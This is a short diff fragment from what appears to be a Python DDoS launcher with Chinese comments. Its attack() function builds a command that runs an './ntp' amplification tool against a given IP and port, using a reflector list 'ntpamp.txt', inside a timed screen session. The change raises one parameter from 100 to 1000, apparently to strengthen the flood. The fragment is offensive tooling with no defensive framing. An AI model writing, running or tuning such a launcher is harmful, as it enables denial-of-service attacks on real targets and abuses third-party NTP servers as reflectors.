@@ -56,7 +56,7 @@ def attack():
 
     # 构建要执行的命令
     # 使用 timeout 确保命令在 60 秒后终止
-    command = f"timeout 60s ./ntp {ip} {port} ntpamp.txt 100 -1 60"
+    command = f"timeout 60s ./ntp {ip} {port} ntpamp.txt 1000 -1 60"
 
     # 启动 screen 会话并在其中执行命令
     try:
